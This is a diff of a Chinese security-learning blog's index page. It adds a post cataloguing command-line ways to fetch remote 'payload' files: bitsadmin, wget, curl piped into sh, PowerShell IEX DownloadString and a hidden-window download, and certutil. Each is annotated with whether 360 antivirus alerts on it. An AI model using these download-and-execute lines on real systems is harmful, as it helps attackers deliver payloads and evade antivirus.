@@ -261,6 +261,176 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/09/10/命令行文件下载的各种姿势/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/10/命令行文件下载的各种姿势/" itemprop="url">命令行文件下载的各种姿势</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-10T12:10:57+08:00">
+                2019-09-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/命令行/" itemprop="url" rel="index">
+                    <span itemprop="name">命令行</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="命令行文件下载的各种姿势"><a href="#命令行文件下载的各种姿势" class="headerlink" title="命令行文件下载的各种姿势"></a>命令行文件下载的各种姿势</h1><h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><ul>
+<li>​       <a href>bitsadmin /rawreturn /transfer down “http://172.22.35.212/payload1.xml”  C:\1.txt</a> </li>
+<li>​       bitsadmin /transferdown /download /prioritynomal “<a href="http://172.22.35.212/payload1.xml&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;</a> C:\1.txt  –进度条</li>
+</ul>
+<p>会引发360弹窗。</p>
+<h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><ul>
+<li>wget -i <a href="http://192.168.0.1/demo.exe" target="_blank" rel="noopener">http://192.168.0.1/demo.exe</a></li>
+</ul>
+<p>360下有弹窗</p>
+<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><ul>
+<li>curl -O <a href="http://192.168.0.1/demo.exe" target="_blank" rel="noopener">http://192.168.0.1/demo.exe</a></li>
+<li>curl <a href="http://192.168.0.107/1.sh" target="_blank" rel="noopener">http://192.168.0.107/1.sh</a> -o- | sh  –sh脚本执行</li>
+</ul>
+<p>360下有弹窗</p>
+<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><ul>
+<li>powershell.exe “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://172.22.35.212/payload1.xml&#39;)&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&#39;)&quot;</a> | out-file payload.xm</li>
+<li>Invoke-WebRequest -Uri  “<a href="http://172.22.35.212/payload1.xml&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;</a>  -OutFile ‘pay.txt’ -UseBasicParsing</li>
+<li>powershell -w hidden Invoke-WebRequest -uri <a href="http://172.22.35.106/PAYLOAD1.XML" target="_blank" rel="noopener">http://172.22.35.106/PAYLOAD1.XML</a> -OutFile 1025.xml</li>
+<li>(New-Object System.Net.WebClient).downloadfile(“<a href="http://172.22.35.212/payload1.xml&quot;,&#39;C:\Users\18130\OneDrive\桌面\1.txt&#39;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;,&#39;C:\Users\18130\OneDrive\桌面\1.txt&#39;</a>)</li>
+</ul>
+<p>第四条360无弹窗</p>
+<h2 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h2><ul>
+<li>certutil -urlcache -split -f <a href="http://172.22.35.212/payload1.xml" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml</a> </li>
+<li>certutil -urlcache -split -f <a href="http://172.22.35.212/payload1.xml" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml</a> delete –清除痕迹</li>
+</ul>
+<p>360下无弹窗<br>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/04/%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/1.jpg" alt="avatar"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/29/CobaltStrike+MetaSploit联动技巧/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1745,7 +1915,7 @@ net%CommonProgramFiles:~10,-18%user=net user</code></pre><p><img src="https://ra
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">29</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1767,7 +1937,7 @@ net%CommonProgramFiles:~10,-18%user=net user</code></pre><p><img src="https://ra
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
